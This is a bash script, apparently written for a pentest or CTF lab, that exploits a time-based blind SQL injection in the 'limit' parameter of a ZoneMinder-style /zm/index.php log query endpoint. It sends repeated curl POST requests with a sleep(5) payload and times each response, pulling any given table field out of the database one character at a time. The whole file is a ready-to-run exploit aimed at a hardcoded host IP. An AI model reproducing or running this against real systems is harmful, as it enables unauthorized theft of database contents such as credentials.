#!/bin/bash

# DEFINITION OF COLORS TO USE IN BASH SCRIPTS
def='\e[39m'
red='\e[38;5;196m'
green='\e[38;5;46m'
yellow='\e[38;5;11m'
blue='\e[38;5;21m'
pink='\e[38;5;13m'
cian='\e[38;5;87m'
white='\e[38;5;15m'
grey='\e[38;5;240m'

# CAPTURE Ctrl+C
trap ctrl_c INT


function ctrl_c(){
echo -e "\n[${yellow}!${def}] Detected Ctrl+C"
echo -e "[${red}*${def}] Finalizing execution..."
tput cnorm
exit 0
}

function usage(){
echo -e "\n${white}[${red}!${white}]${def} One of the following ERRORS has occurred:"
echo -e "\t- The name of the table to be listed has not been provided (as argument 1)"
echo -e "\t- The name of the field to be enumerated (as argument 2) has not been provided"
echo -e "\t- More arguments have been provided than expected (max. 3)\n"
echo -e "${white}[${def}-${white}]${def} USAGE:\n\t${white}$0 ${yellow} <field_name> <table_name> ${grey}[field_length]${def}"
echo -e "\t${grey}$0 username Users 20${def}"
echo -e "\n\n${white}[${yellow}!${white}]${def} REMEMBER:\n\tThe ${white}names${def} of the ${white}tables${def} are ${white}CASE SENSITIVE${def}"
echo -e "\tTry with the first letter in upper case and the rest in lower case"
exit 0
}

if [[ "$#" -lt "2" ]]
then
usage
fi

if [[ "$#" -gt "3" ]]
then
usage
fi

tput civis

# ADAPT THESE VALUES
host='192.168.102.52'
fieldname=$1 # pass the name of the field to enumerate as argument 1
tablename=$2 # pass the name of the table to enumerate as argument 2
resultlimit=100
charlimit=100

# correct the character limit depending on whether one is given as argument 3
if [[ "$#" -eq "3" ]]
then
charlimit=$3
fi

# variable to store the characters to be tested
char='0123456789abcdefghijklmnopqrstuvwxyz.:*@#$%^&-_=()!ยก\/{}[]'

# variable to store the results
result=""
whitechar=0
whiteresult=0

echo -e "\n${white}[${green}*${white}] --- Enumerating field ${yellow}$fieldname${def} of the table ${yellow}$tablename ${white}based on ID --- [${green}*${white}]${def}\n"
for (( t=0; t <= $resultlimit; t++)) # limit of RESULTS to obtain
do
if [[ "whiteresult" -ge "2" ]]
then
echo -e "[${yellow}ยก${def}] Second ID blank"
echo -e "[${green}*${def}] End of enumeration of field $fieldname in table $tablename"
tput cnorm
exit 0
fi
echo -e "${white}Enumerating ID ${cian}$t${white} of field $fieldname${def}\n"
for (( i=1; i <= $charlimit; i++))
do
if [[ "whitechar" -ge "2" ]]
then
echo -e "  \e[1A\e[K[${grey}-${def}] Second blank character"
echo -e "  End of ID enumeration $t of the field $fieldname\n"
echo -e "  ${white}Value of the $fieldname field for ID $t: ${green}$result${def}\n\n"
chrlen=${#result}
if [[ "$chrlen" -le 1 ]]
then
whiteresult=$((whiteresult + 1))
fi
break
fi

# nested loop that goes through each of the characters stored in the variable char
for (( k=0; k<${#char}; k++ ))
do
echo -e "  \e[1A\e[KTesting character ${char:$k:1} in position $i: $result""_"

SECONDS=0
curl -X POST "http://$host/zm/index.php" \
-d "view=request&request=log&task=query&limit=100;( SELECT * FROM ( SELECT( if( \
substr((select $fieldname from $tablename where id=$t),$i,1)='${char:$k:1}',sleep(5),1 \
) ) )OQkj)#minTime=1'" &>/dev/null

DURATION=$SECONDS

# check if the difference between the start and end time is greater than 5 seconds
if [[ "$DURATION" -ge "4" ]]
then
result+=${char:$k:1}
if [[ "$i" -ge 1 ]]
then
if [[ "$whitechar" -eq 1 ]] # write correction if the first character was blank but not the others
then
echo -e "  \e[1A\e[KCharacters found: $result\n"
whitechar=0
break
else
echo -e "  \e[2A\e[KCharacters found: $result\n"
whitechar=0
break
fi
else
echo -e "  \e[1A\e[KCharacters found: $result\n"
break
fi
else
if [[ "${char:$k:1}" = "z" ]]
then
whitechar=$((whitechar+1))
fi
fi
done
done
if [[ "whitechar" -ge "2" ]]
then
whitechar=0
result=""
else
echo -e "  The limit of $charlimit characters per field has been reached."
echo -e "\n  ${yellow}Value of the $fieldname field for ID $t: ${green}$result${def}\n\n"
whitechar=0
result=""
fi
done
echo -e "[${green}*${def}] End of enumeration of field $fieldname in table $tablename"
tput cnorm